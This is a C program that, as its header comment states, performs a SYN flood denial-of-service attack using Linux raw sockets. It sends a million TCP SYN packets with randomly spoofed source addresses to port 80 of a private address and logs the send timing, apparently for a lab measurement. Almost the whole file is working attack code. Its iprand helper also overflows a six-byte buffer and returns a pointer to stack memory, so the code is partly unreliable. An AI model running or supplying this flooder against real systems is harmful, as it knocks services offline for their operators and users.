/*
	Syn Flood DOS with LINUX sockets
*/
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdlib.h>
#include<stdio.h>
#include<string.h> 
#include<sys/socket.h>
#include<stdlib.h> 
#include<errno.h> 
#include<netinet/tcp.h>	
#include<netinet/udp.h>	
#include<netinet/ip.h>
#include <sys/time.h> 
char * iprand();
struct pseudo_header  
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((unsigned char*)&oddbyte)=*(unsigned char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

int main (int argc, char **argv)
{
	FILE* fd;    
	double sum=0;
    int counter=0;
	fd=fopen("syns_results_c.txt","w");
	char * dest="10.0.2.4";
	int port=80;
	char * protocol ="TCP";
	struct timeval begin,end;
	char buff_time[20]={0};


	srand(time(NULL));
	// //Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s == -1)
	{
		//socket creation failed, may be because of non-root privileges
		perror("Failed to create raw socket");
		exit(1);
	}

    for(int i=0; i <100 ; i++)
	{
    	for(int j=0; j< 10000; j++)
		{

			//Datagram to represent the packet
			char datagram[4096] , source_ip[32], *pseudogram;
			//IP header
			struct iphdr *iph = (struct iphdr *) datagram;
			//TCP header
			struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
			struct sockaddr_in sin;
			struct pseudo_header psh;

  			strcpy(source_ip , iprand());

			sin.sin_family = AF_INET;
			sin.sin_port = htons(port);
			sin.sin_addr.s_addr = inet_addr (dest);
	
			memset (datagram, 0, 4096);	/* zero out the buffer */

			//Fill in the IP Header
			iph->ihl = 5;
			iph->version = 4;
			iph->tos = 0;
			iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
			iph->protocol = IPPROTO_TCP;
			iph->id = htons(54321);	//Id of this packet
			iph->frag_off = 0;
			iph->ttl = 255;
	
			iph->check = 0;		//Set to 0 before calculating checksum
			iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
			iph->daddr = sin.sin_addr.s_addr;
			iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

			//TCP Header
			tcph->source = htons (rand()%65535);
			tcph->dest = htons (port);
			tcph->seq = 0;
			tcph->ack_seq = 0;
			tcph->doff = 5;		/* first and only tcp segment */
			tcph->fin=0;
			tcph->syn=1;
			tcph->rst=0;
			tcph->psh=0;
			tcph->ack=0;
			tcph->urg=0;
			tcph->window = htons (5840);	/* maximum allowed window size */
			tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
			tcph->urg_ptr = 0;
			//Now the IP checksum
	
			psh.source_address = inet_addr( source_ip );
			psh.dest_address = sin.sin_addr.s_addr;
			psh.placeholder = 0;
			psh.protocol = IPPROTO_TCP;
			psh.tcp_length = htons(20);
	
			memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

			tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

			//IP_HDRINCL to tell the kernel that headers are included in the packet
			int one = 1;
			const int *val = &one;
			if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
			{
				printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
				exit(0);
			}
		    gettimeofday(&begin,0);
			if (sendto (s,datagram,iph->tot_len,0,(struct sockaddr *)&sin,sizeof (sin)) < 0)
			{
				printf ("error\n");
			}
			gettimeofday(&end,0);
			counter ++;
			long seconds = end.tv_sec - begin.tv_sec;
    		long microseconds = end.tv_usec - begin.tv_usec;
    		double time = seconds+microseconds*1e-6;
    		sum+=time;
			char buff_counter[20]={0};
    		char buff_time[20]={0};
    		sprintf(buff_counter,"%d",counter);
    		sprintf(buff_time,"%f",time*1000);
    		fprintf(fd,"%s",buff_counter);
    		fprintf(fd,"%c",',');
    		fprintf(fd,"%s",buff_time);
    		fprintf(fd,"%c",'\n');
			
		}
	}
			double avg_time=sum/counter;
    		sprintf(buff_time,"%f",avg_time*1000);
    		fprintf(fd,"%s",buff_time);
    		fprintf(fd,"%c",'\n');
    		fclose(fd);

	return 0;
}
char * iprand(){
char * s;
char  c1[6];
char  c2[6];
char  c3[6];
char  c4[6];

int cnt1=rand()%255;
int cnt2=rand()%255;
int cnt3=rand()%255;
int cnt4=rand()%255;
sprintf(c1,"%d",cnt1);
sprintf(c2,"%d",cnt2);
sprintf(c3,"%d",cnt3);
sprintf(c4,"%d",cnt4);
s=strcat(c1,".");
s=strcat(s,c2);
s=strcat(s,".");
s=strcat(s,c3);
s=strcat(s,".");
s=strcat(s,c4);

return s;
}
